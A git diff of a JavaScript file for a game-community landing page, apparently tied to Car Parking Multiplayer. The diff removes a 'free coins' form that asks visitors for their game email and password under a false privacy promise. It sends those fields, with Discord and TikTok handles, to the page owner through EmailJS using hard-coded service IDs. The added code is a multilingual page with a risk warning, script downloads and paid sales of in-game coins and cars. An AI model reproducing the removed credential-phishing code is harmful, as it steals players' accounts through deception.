@@ -1,351 +1,285 @@
-// Import EmailJS library
-const emailjs = require('emailjs-com');
+// ========================================
+// SIKAN - ELEGANT LANDING PAGE
+// Multi-language Support
+// ========================================
 
-// Configuración de EmailJS con tus IDs
-const EMAILJS_CONFIG = {
-    publicKey: 'ski84HOi4a8aCWMOu',
-    serviceId: 'service_a6007bp',
-    templateId: 'template_xjhsbgg'
-};
-
-// Inicializar EmailJS
-emailjs.init(EMAILJS_CONFIG.publicKey);
-
-// Traducciones
+// Translations
 const translations = {
     es: {
-        name: "SIKAN",
-        title: "Humilde y generoso de CPM",
-        about: "Acerca de mí",
-        description: "Una persona humilde amante de los autos y que le gusta compartir con la comunidad LATINA y poder regarle cosas relacionadas con CPM.",
-        wantCoins: "¡QUIERO MONEDAS!",
-        socialMedia: "Redes Sociales",
-        communities: "Mis Comunidades",
-        join: "Unirse",
-        contact: "Contacto",
-        requestCoins: "Solicitar Monedas",
-        back: "Volver",
-        privacyNotice: "ESTOS DATOS NO SERÁN COMPARTIDOS NI PÚBLICOS PARA OTRAS PERSONAS, ESTOS DATOS QUEDARÁN GUARDADOS Y PROTEGIDOS POR SIKAN",
-        shareData: "DESPUÉS, COMPARTA SUS DATOS DE CPM EN CORREO Y CONTRASEÑA",
-        email: "Correo",
-        password: "Contraseña",
-        discord: "Discord (OBLIGATORIO TENERLO)",
-        nameField: "Nombre",
-        userCpm: "User de CPM",
-        userTiktok: "User de TikTok",
-        submitCoins: "Solicitar Monedas",
-        successMessage: "Se ha enviado correctamente los datos, espera a que SIKAN conteste este formulario."
+        warning_title: "¡ADVERTENCIA!",
+        warning_text: "El uso de archivos y scripts mostrados aquí es bajo tu propia responsabilidad.",
+        enter_button: "ENTRAR",
+        subtitle: "Plataforma de Acceso",
+        downloads: "Descargas",
+        sikanus_gg: "SIKANUS GG",
+        virtual_space: "Espacio Virtual",
+        recent_script: "Script Reciente",
+        services: "💎 Compra de Servicios 💎",
+        services_desc: "Monedas, Dinero, Carros Premium, etc.",
+        communities: "Comunidades",
+        whatsapp_group: "WhatsApp",
+        discord_group: "Discord",
+        social: "Redes Sociales",
+        footer: "© 2025 SIKANUS | Acceso Restringido"
     },
     en: {
-        name: "SIKAN",
-        title: "Humble and generous from CPM",
-        about: "About me",
-        description: "A humble person who loves cars and likes to share with the LATIN community and be able to give things related to CPM.",
-        wantCoins: "I WANT COINS!",
-        socialMedia: "Social Media",
-        communities: "My Communities",
-        join: "Join",
-        contact: "Contact",
-        requestCoins: "Request Coins",
-        back: "Back",
-        privacyNotice: "THIS DATA WILL NOT BE SHARED OR PUBLIC TO OTHER PEOPLE, THIS DATA WILL BE SAVED AND PROTECTED BY SIKAN",
-        shareData: "THEN, SHARE YOUR CPM DATA IN EMAIL AND PASSWORD",
-        email: "Email",
-        password: "Password",
-        discord: "Discord (MANDATORY TO HAVE IT)",
-        nameField: "Name",
-        userCpm: "CPM User",
-        userTiktok: "TikTok User",
-        submitCoins: "Request Coins",
-        successMessage: "The data has been sent correctly, wait for SIKAN to answer this form."
+        warning_title: "WARNING!",
+        warning_text: "The use of files and scripts shown here is at your own risk.",
+        enter_button: "ENTER",
+        subtitle: "Access Platform",
+        downloads: "Downloads",
+        sikanus_gg: "SIKANUS GG",
+        virtual_space: "Virtual Space",
+        recent_script: "Recent Script",
+        services: "💎 Service Purchase 💎",
+        services_desc: "Coins, Money, Premium Cars, etc.",
+        communities: "Communities",
+        whatsapp_group: "WhatsApp",
+        discord_group: "Discord",
+        social: "Social Media",
+        footer: "© 2025 SIKANUS | Restricted Access"
     },
-    fr: {
-        name: "SIKAN",
-        title: "Humble et généreux de CPM",
-        about: "À propos de moi",
-        description: "Une personne humble qui aime les voitures et aime partager avec la communauté LATINE et pouvoir donner des choses liées au CPM.",
-        wantCoins: "JE VEUX DES PIÈCES!",
-        socialMedia: "Réseaux Sociaux",
-        communities: "Mes Communautés",
-        join: "Rejoindre",
-        contact: "Contact",
-        requestCoins: "Demander des Pièces",
-        back: "Retour",
-        privacyNotice: "CES DONNÉES NE SERONT PAS PARTAGÉES OU PUBLIQUES À D'AUTRES PERSONNES, CES DONNÉES SERONT SAUVEGARDÉES ET PROTÉGÉES PAR SIKAN",
-        shareData: "ENSUITE, PARTAGEZ VOS DONNÉES CPM DANS L'EMAIL ET LE MOT DE PASSE",
-        email: "Email",
-        password: "Mot de passe",
-        discord: "Discord (OBLIGATOIRE DE L'AVOIR)",
-        nameField: "Nom",
-        userCpm: "Utilisateur CPM",
-        userTiktok: "Utilisateur TikTok",
-        submitCoins: "Demander des Pièces",
-        successMessage: "Les données ont été envoyées correctement, attendez que SIKAN réponde à ce formulaire."
+    "pt-br": {
+        warning_title: "AVISO!",
+        warning_text: "O uso de arquivos e scripts mostrados aqui é por sua conta e risco.",
+        enter_button: "ENTRAR",
+        subtitle: "Plataforma de Acesso",
+        downloads: "Downloads",
+        sikanus_gg: "SIKANUS GG",
+        virtual_space: "Espaço Virtual",
+        recent_script: "Script Recente",
+        services: "💎 Compra de Serviços 💎",
+        services_desc: "Moedas, Dinheiro, Carros Premium, etc.",
+        communities: "Comunidades",
+        whatsapp_group: "WhatsApp",
+        discord_group: "Discord",
+        social: "Redes Sociais",
+        footer: "© 2025 SIKANUS | Acesso Restrito"
+    },
+    "pt-pt": {
+        warning_title: "AVISO!",
+        warning_text: "O uso de ficheiros e scripts mostrados aqui é da sua responsabilidade.",
+        enter_button: "ENTRAR",
+        subtitle: "Plataforma de Acesso",
+        downloads: "Downloads",
+        sikanus_gg: "SIKANUS GG",
+        virtual_space: "Espaço Virtual",
+        recent_script: "Script Recente",
+        services: "💎 Compra de Serviços 💎",
+        services_desc: "Moedas, Dinheiro, Carros Premium, etc.",
+        communities: "Comunidades",
+        whatsapp_group: "WhatsApp",
+        discord_group: "Discord",
+        social: "Redes Sociais",
+        footer: "© 2025 SIKANUS | Acesso Restrito"
+    },
+    ru: {
+        warning_title: "ВНИМАНИЕ!",
+        warning_text: "Использование файлов и скриптов, показанных здесь, осуществляется на ваш риск.",
+        enter_button: "ВОЙТИ",
+        subtitle: "Платформа доступа",
+        downloads: "Загрузки",
+        sikanus_gg: "SIKANUS GG",
+        virtual_space: "Виртуальное пространство",
+        recent_script: "Недавний скрипт",
+        services: "💎 Покупка услуг 💎",
+        services_desc: "Монеты, Деньги, Премиум-автомобили и т.д.",
+        communities: "Сообщества",
+        whatsapp_group: "WhatsApp",
+        discord_group: "Discord",
+        social: "Социальные сети",
+        footer: "© 2025 SIKANUS | Ограниченный доступ"
     }
 };
 
+// Variables globales
 let currentLanguage = 'es';
 
-// Función para mostrar el formulario de monedas
-function showCoinsForm() {
-    const mainPage = document.getElementById('mainPage');
-    const formPage = document.getElementById('formPage');
-    
-    // Animación de salida de la página principal
-    mainPage.style.transform = 'translateX(-100%)';
-    mainPage.style.opacity = '0';
-    
-    setTimeout(() => {
-        mainPage.style.display = 'none';
-        formPage.style.display = 'flex';
-        
-        // Animación de entrada del formulario
-        setTimeout(() => {
-            formPage.style.transform = 'translateX(0)';
-            formPage.style.opacity = '1';
-        }, 50);
-    }, 300);
-}
-
-// Función para volver a la página principal
-function goBackToMain() {
-    const mainPage = document.getElementById('mainPage');
-    const formPage = document.getElementById('formPage');
-    
-    // Animación de salida del formulario
-    formPage.style.transform = 'translateX(100%)';
-    formPage.style.opacity = '0';
-    
-    setTimeout(() => {
-        formPage.style.display = 'none';
-        mainPage.style.display = 'flex';
-        
-        // Animación de entrada de la página principal
-        setTimeout(() => {
-            mainPage.style.transform = 'translateX(0)';
-            mainPage.style.opacity = '1';
-        }, 50);
-    }, 300);
-}
-
-// Función para enviar el formulario con EmailJS
-function submitCoinsForm(event) {
-    event.preventDefault();
-    
-    const submitBtn = document.querySelector('.submit-btn');
-    const originalText = submitBtn.innerHTML;
-    
-    // Efecto de carga
-    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Enviando...</span>';
-    submitBtn.disabled = true;
-    
-    // Obtener datos del formulario
-    const formData = {
-        email: document.getElementById('email').value,
-        password: document.getElementById('password').value,
-        discord: document.getElementById('discord').value,
-        nombre: document.getElementById('nombre').value,
-        userCpm: document.getElementById('userCpm').value,
-        userTiktok: document.getElementById('userTiktok').value,
-        fecha: new Date().toLocaleString('es-ES')
-    };
-    
-    // Enviar con EmailJS
-    emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, formData)
-        .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
-            showNotification(translations[currentLanguage].successMessage, 'success');
-            document.getElementById('coinsForm').reset();
-            
-            setTimeout(() => {
-                goBackToMain();
-            }, 2000);
-        })
-        .catch(function(error) {
-            console.log('FAILED...', error);
-            showNotification('Error al enviar. Intenta de nuevo.', 'error');
-        })
-        .finally(function() {
-            submitBtn.innerHTML = originalText;
-            submitBtn.disabled = false;
-        });
-}
-
-// Función para cambiar idioma
-function changeLanguage() {
-    const selectedLang = document.getElementById('languageSelect').value;
-    currentLanguage = selectedLang;
-    const elements = document.querySelectorAll('[data-translate]');
-    
-    elements.forEach(element => {
-        const key = element.getAttribute('data-translate');
-        if (translations[selectedLang] && translations[selectedLang][key]) {
-            element.textContent = translations[selectedLang][key];
-        }
-    });
-    
-    // Guardar preferencia de idioma
-    localStorage.setItem('preferredLanguage', selectedLang);
-    
-    // Efecto visual al cambiar idioma
-    const card = document.querySelector('.card');
-    if (card) {
-        card.style.transform = 'scale(0.95)';
-        setTimeout(() => {
-            card.style.transform = 'scale(1)';
-        }, 200);
-    }
-}
-
-// Función para abrir redes sociales
-function openSocial(platform) {
-    const urls = {
-        instagram: 'https://www.instagram.com/cpm_sikan?igsh=b2NiYTJiODVma2p5&utm_source=qr',
-        youtube: 'https://youtube.com/@sikanoficial?si=XalXLF9sWAS7FaoD',
-        tiktok: 'https://www.tiktok.com/@sikanoficial2?_t=ZM-8yQOGZ0RJ3u&_r=1'
-    };
-    
-    // Efecto visual
-    event.target.closest('.social-link').style.transform = 'scale(0.95)';
-    setTimeout(() => {
-        event.target.closest('.social-link').style.transform = 'scale(1)';
-    }, 150);
-    
-    showNotification(`Abriendo ${platform.charAt(0).toUpperCase() + platform.slice(1)}...`, 'info');
-    
-    // Abrir la URL real
-    window.open(urls[platform], '_blank');
-}
-
-// Función para unirse a comunidades
-function joinCommunity(platform) {
-    const button = event.target;
-    const originalText = button.textContent;
-    
-    button.textContent = 'Conectando...';
-    button.disabled = true;
-    
-    setTimeout(() => {
-        button.textContent = '¡Unido!';
-        button.style.background = '#4CAF50';
-        
-        if (platform === 'discord') {
-            window.open('https://discord.gg/4VfdcxmP', '_blank');
-        }
-        
-        showNotification(`¡Te has unido a la comunidad de ${platform.charAt(0).toUpperCase() + platform.slice(1)}!`, 'success');
-        
-        setTimeout(() => {
-            button.textContent = originalText;
-            button.disabled = false;
-            button.style.background = '#667eea';
-        }, 2000);
-    }, 1500);
-}
-
-// Sistema de notificaciones
-function showNotification(message, type = 'info') {
-    // Crear elemento de notificación
-    const notification = document.createElement('div');
-    notification.className = `notification ${type}`;
-    notification.innerHTML = `
-        <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
-        <span>${message}</span>
-    `;
-    
-    // Estilos de la notificación
-    notification.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        background: ${type === 'success' ? '#4CAF50' : type === 'error' ? '#f44336' : '#2196F3'};
-        color: white;
-        padding: 15px 20px;
-        border-radius: 10px;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        z-index: 1001;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        font-size: 14px;
-        max-width: 350px;
-        animation: slideInRight 0.3s ease-out;
-    `;
-    
-    // Agregar estilos de animación
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes slideInRight {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        @keyframes slideOutRight {
-            from { transform: translateX(0); opacity: 1; }
-            to { transform: translateX(100%); opacity: 0; }
-        }
-    `;
-    document.head.appendChild(style);
-    
-    document.body.appendChild(notification);
-    
-    // Remover después de 5 segundos
-    setTimeout(() => {
-        notification.style.animation = 'slideOutRight 0.3s ease-out';
-        setTimeout(() => {
-            if (notification.parentNode) {
-                notification.parentNode.removeChild(notification);
-            }
-        }, 300);
-    }, 5000);
-}
-
-// Efectos adicionales al cargar la página
+// Initialize
 document.addEventListener('DOMContentLoaded', function() {
-    // Cargar idioma guardado
-    const savedLang = localStorage.getItem('preferredLanguage');
-    if (savedLang) {
-        currentLanguage = savedLang;
-        document.getElementById('languageSelect').value = savedLang;
-        changeLanguage();
-    }
+    // Elementos del DOM
+    const warningModal = document.getElementById('warning-modal');
+    const enterButton = document.getElementById('enter-btn');
+    const mainContent = document.getElementById('main-content');
+    const langButtons = document.querySelectorAll('.lang-btn');
+
+    // ========================================
+    // SISTEMA DE IDIOMAS
+    // ========================================
     
-    // Efecto de aparición gradual para elementos
-    const elements = document.querySelectorAll('.social-link, .community');
-    elements.forEach((element, index) => {
-        element.style.opacity = '0';
-        element.style.transform = 'translateY(20px)';
-        setTimeout(() => {
-            element.style.transition = 'all 0.5s ease';
-            element.style.opacity = '1';
-            element.style.transform = 'translateY(0)';
-        }, index * 100);
-    });
-    
-    // Mensaje de bienvenida
-    setTimeout(() => {
-        showNotification('¡Bienvenido! Explora mis redes y comunidades 👋', 'info');
-    }, 1000);
-});
-
-// Efectos de hover adicionales
-document.addEventListener('mouseover', function(e) {
-    if (e.target.closest('.community')) {
-        e.target.closest('.community').style.transform = 'translateX(5px) scale(1.02)';
+    /**
+     * Actualiza el idioma de la página
+     */
+    function changeLanguage(lang) {
+        currentLanguage = lang;
+        
+        // Actualizar todos los elementos con atributo data-i18n
+        const elements = document.querySelectorAll('[data-i18n]');
+        elements.forEach(element => {
+            const key = element.getAttribute('data-i18n');
+            if (translations[lang] && translations[lang][key]) {
+                element.textContent = translations[lang][key];
+            }
+        });
+        
+        // Actualizar clase activa en botones de idioma
+        langButtons.forEach(btn => {
+            btn.classList.remove('active');
+            if (btn.getAttribute('data-lang') === lang) {
+                btn.classList.add('active');
+            }
+        });
+        
+        // Guardar preferencia de idioma
+        localStorage.setItem('sikan-language', lang);
     }
-});
 
-document.addEventListener('mouseout', function(e) {
-    if (e.target.closest('.community')) {
-        e.target.closest('.community').style.transform = 'translateX(0) scale(1)';
-    }
-});
+    /**
+     * Carga el idioma guardado o usa el idioma del navegador
+     */
+    function loadLanguagePreference() {
+        // Verificar si hay idioma guardado
+        const saved = localStorage.getItem('sikan-language');
+        if (saved && translations[saved]) {
+            changeLanguage(saved);
+            return;
+        }
 
-// Cerrar con tecla ESC
-document.addEventListener('keydown', function(event) {
-    if (event.key === 'Escape') {
-        const formPage = document.getElementById('formPage');
-        if (formPage.style.display !== 'none') {
-            goBackToMain();
+        // Intentar usar el idioma del navegador
+        const browserLang = navigator.language.toLowerCase();
+        if (translations[browserLang]) {
+            changeLanguage(browserLang);
+        } else if (browserLang.includes('pt')) {
+            // Para portugués, usar pt-br como default
+            changeLanguage('pt-br');
+        } else if (translations[browserLang.split('-')[0]]) {
+            // Usar solo el código de país (ej: 'en' de 'en-US')
+            changeLanguage(browserLang.split('-')[0]);
+        } else {
+            // Default a español
+            changeLanguage('es');
         }
     }
+
+    // Agregar event listeners a botones de idioma
+    langButtons.forEach(btn => {
+        btn.addEventListener('click', function() {
+            const lang = this.getAttribute('data-lang');
+            changeLanguage(lang);
+        });
+    });
+
+    // ========================================
+    // FUNCIONALIDAD DEL MODAL DE ADVERTENCIA
+    // ========================================
+    
+    /**
+     * Cierra el modal de advertencia y muestra el contenido principal
+     */
+    function closeWarningModal() {
+        warningModal.style.transition = 'opacity 0.4s ease';
+        warningModal.style.opacity = '0';
+        
+        setTimeout(function() {
+            warningModal.classList.add('hidden');
+            mainContent.classList.remove('hidden');
+            
+            // Guardar que el usuario aceptó la advertencia
+            localStorage.setItem('sikan-accepted', 'true');
+        }, 400);
+    }
+
+    // Event listener para el botón ENTRAR
+    if (enterButton) {
+        enterButton.addEventListener('click', closeWarningModal);
+    }
+
+    // Permitir cerrar con la tecla Enter
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Enter' && !warningModal.classList.contains('hidden')) {
+            closeWarningModal();
+        }
+    });
+
+    // Cargar preferencia de idioma e iniciar
+    loadLanguagePreference();
+
+    // Verificar si ya aceptó la advertencia (opcional)
+    // Descomentar para recordar si el usuario aceptó anteriormente
+    // if (localStorage.getItem('sikan-accepted') === 'true') {
+    //     closeWarningModal();
+    // }
+
+    // ========================================
+    // EFECTOS DE INTERACCIÓN
+    // ========================================
+    
+    /**
+     * Efecto de hover suave en botones
+     */
+    const allButtons = document.querySelectorAll('.download-btn, .contact-btn, .social-btn, .enter-button');
+    
+    allButtons.forEach(function(button) {
+        button.addEventListener('mouseenter', function() {
+            // Agregar efecto de escala suave
+            if (!this.classList.contains('lang-btn')) {
+                this.style.transition = 'all 0.3s ease';
+            }
+        });
+    });
+
+    // ========================================
+    // SCROLL SMOOTH Y ANIMACIONES
+    // ========================================
+    
+    /**
+     * Observador de intersección para animaciones en scroll
+     */
+    const observerOptions = {
+        threshold: 0.1,
+        rootMargin: '0px 0px -50px 0px'
+    };
+
+    const observer = new IntersectionObserver(function(entries) {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.opacity = '1';
+                entry.target.style.transform = 'translateY(0)';
+            }
+        });
+    }, observerOptions);
+
+    // Aplicar observer a secciones
+    const sections = document.querySelectorAll('.download-section, .services-section, .contact-section, .social-section');
+    sections.forEach(section => {
+        section.style.opacity = '0';
+        section.style.transform = 'translateY(20px)';
+        section.style.transition = 'all 0.6s ease';
+        observer.observe(section);
+    });
+
+    // ========================================
+    // CONSOLE MESSAGE
+    // ========================================
+    console.log('%c🚀 SIKAN - Access Platform Loaded', 'color: #ffffff; font-size: 16px; font-weight: bold;');
+    console.log('%cElegant & Minimalist Design', 'color: #b0b0b0; font-size: 12px;');
 });
+
+// ========================================
+// UTILIDADES GLOBALES
+// ========================================
+
+/**
+ * Función auxiliar para cambiar idioma desde consola
+ */
+window.changeSikanLanguage = function(lang) {
+    if (translations[lang]) {
+        const buttons = document.querySelectorAll('[data-lang="' + lang + '"]');
+        if (buttons.length > 0) {
+            buttons[0].click();
+            console.log('Idioma cambiado a: ' + lang);
+        }
+    } else {
+        console.log('Idioma no disponible. Idiomas disponibles: es, en, pt-br, pt-pt, ru');
+    }
+};
